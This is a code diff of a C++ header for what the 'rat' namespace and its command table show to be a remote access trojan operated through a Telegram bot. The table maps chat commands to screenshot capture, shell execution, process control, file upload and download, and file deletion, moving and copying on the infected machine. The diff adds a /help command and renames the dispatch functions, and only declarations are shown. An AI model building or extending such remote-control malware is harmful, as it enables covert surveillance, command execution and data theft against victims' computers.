@@ -5,7 +5,11 @@
 #include "rat/tbot/types.hpp"
 #include "rat/networking.hpp"
 
+
 namespace rat::handler {
+
+
+
 
 class Handler {
 private:
@@ -19,7 +23,7 @@ private:
         void (Handler::*handler)();
     };
     
-    const std::array<CommandHandler, 17> command_map = {{
+    const std::array<CommandHandler, 18> command_map = {{
         {"/screenshot",   &Handler::handleScreenshotCommand},
         {"/sh",           &Handler::parseAndHandleShellCommand},
         {"/process",      &Handler::parseAndHandleProcessCommand},
@@ -36,7 +40,8 @@ private:
         {"/rm",           &Handler::handleRmCommand},
         {"/mv",           &Handler::handleMvCommand},
         {"/cp",           &Handler::handleCpCommand},
-        {"/set",          &Handler::handleSetCommand}
+        {"/set",          &Handler::handleSetCommand},
+        {"/help",         &Handler::handleHelpCommand}
     }};
     
     rat::tbot::Update telegram_update;
@@ -45,32 +50,33 @@ private:
    
 
   // Parse Telegram message to command
-  Command parseTelegramMessageToCommand(void);
+    Command parseTelegramMessageToCommand(void);
     
   // Command handler methods
-  void handleScreenshotCommand();
-  void parseAndHandleShellCommand();
-  void parseAndHandleProcessCommand();
-  void handleMenuCommand();
-  void handleMessageWithUploadedFiles();
-  void handleDownloadCommand();
-  void handleUploadCommand();
-  void handlePwdCommand();
-  void handleCdCommand();
-  void handleLsCommand();
-  void handleReadCommand();
-  void handleTouchCommand();
-  void handleGetCommand();
-  void handleStatCommand();
-  void handleRmCommand();
-  void handleMvCommand();
-  void handleCpCommand();
-  void handleSetCommand();
+    void handleScreenshotCommand();
+    void parseAndHandleShellCommand();
+    void parseAndHandleProcessCommand();
+    void handleHelpCommand();
+    void handleMenuCommand();
+    void handleMessageWithUploadedFiles();
+    void handleDownloadCommand();
+    void handleUploadCommand();
+    void handlePwdCommand();
+    void handleCdCommand();
+    void handleLsCommand();
+    void handleReadCommand();
+    void handleTouchCommand();
+    void handleGetCommand();
+    void handleStatCommand();
+    void handleRmCommand();
+    void handleMvCommand();
+    void handleCpCommand();
+    void handleSetCommand();
 
-    // Dispatcher - direct member function calls
-  void dispatch();
+    // Dispatchers - direct member function calls
+    void dispatchIntegratedCommand();
 
-  void dynamic_command_dispatch();
+    void dispatchDynamicCommand();
 
 public:
     Handler(rat::tbot::Bot& arg_Bot):
